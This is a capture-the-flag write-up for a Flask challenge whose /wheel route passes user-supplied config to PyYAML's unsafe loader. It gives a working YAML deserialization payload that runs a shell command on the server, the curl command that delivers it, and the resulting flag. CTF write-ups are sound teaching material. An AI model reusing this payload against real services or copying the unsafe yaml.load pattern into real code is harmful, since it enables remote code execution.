# Wheels N Whales

## Task

I've heard that whales and wheels are the new hot thing. So a buddy of mine build a website where you can get your own. I think he hid an easter egg somewhere, but I can't get to it, can you help me?

File: web.py

## Solution

We are given a flask application, snippets:

```python
EASTER_WHALE = {"name": "TheBestWhaleIsAWhaleEveryOneLikes", "image_num": 2, "weight": 34}

class Whale:
    def __init__(self, name, image_num, weight):
        self.name = name
        self.image_num = image_num
        self.weight = weight

    def dump(self):
        return yaml.dump(self.__dict__)


@app.route("/whale", methods=["GET", "POST"])
def whale():
    if request.method == "POST":
        name = request.form["name"]
        if len(name) > 10:
            return make_response("Name to long. Whales can only understand names up to 10 chars", 400)
        image_num = request.form["image_num"]
        weight = request.form["weight"]
        whale = Whale(name, image_num, weight)
        if whale.__dict__ == EASTER_WHALE:
            return make_response(flag.get_flag(), 200)
        return make_response(render_template("whale.html.jinja", w=whale, active="whale"), 200)
    return make_response(render_template("whale_builder.html.jinja", active="whale"), 200)


class Wheel:
    def __init__(self, name, image_num, diameter):
        self.name = name
        self.image_num = image_num
        self.diameter = diameter
    @staticmethod
    def from_configuration(config):
        return Wheel(**yaml.load(config, Loader=yaml.Loader))
    def dump(self):
        return yaml.dump(self.__dict__)


@app.route("/wheel", methods=["GET", "POST"])
def wheel():
    if request.method == "POST":
        if "config" in request.form:
            wheel = Wheel.from_configuration(request.form["config"])
            return make_response(render_template("wheel.html.jinja", w=wheel, active="wheel"), 200)
        name = request.form["name"]
        image_num = request.form["image_num"]
        diameter = request.form["diameter"]
        wheel = Wheel(name, image_num, diameter)
        print(wheel.dump())
        return make_response(render_template("wheel.html.jinja", w=wheel, active="wheel"), 200)
    return make_response(render_template("wheel_builder.html.jinja", active="wheel"), 200)
```


We need to execute the function `flag.get_flag`, but we can't provide the required name. So why is there a second route and class? If we look at the static method of `Wheel` it provides a `from_configuration` which is called if `/wheel` is post requested with a configuration that is directly parsed by the `yaml.Loader`. The loader in this case is the `UnsafeLoader` which is called that way for backwards compatibility: https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation

I recently participated in the AppSec-IL CTF and there was a similar challenge, here is a good writeup: https://jctf.team/AppSec-IL-2020/Resume.yml/

I tried a lot of things that are documented here to execute a function to save it's value in the name of the wheel. Here is the full list: https://pyyaml.org/wiki/PyYAMLDocumentation#yaml-tags-and-python-types

But then I realized I could just `cat` the source code and get it from there. So the payload is pretty much the one from the writeup linked before:

```yaml
diameter: 1
image_num: 1
name: !!python/object/apply:subprocess.check_output [["cat", "flag.py"]]
```

Now do a curl request with that as the parameter config:

```bash
$ curl http://chal.cybersecurityrumble.de:7780/wheel --data-urlencode 'config@payload.txt' -vvv
...
<h1>b'def get_flag():\n    return "CSR{TH3_QU3STION_I5_WHY_WHY_CAN_IT_DO_THAT?!?}"\n\n\n\n'</h1>
...
```
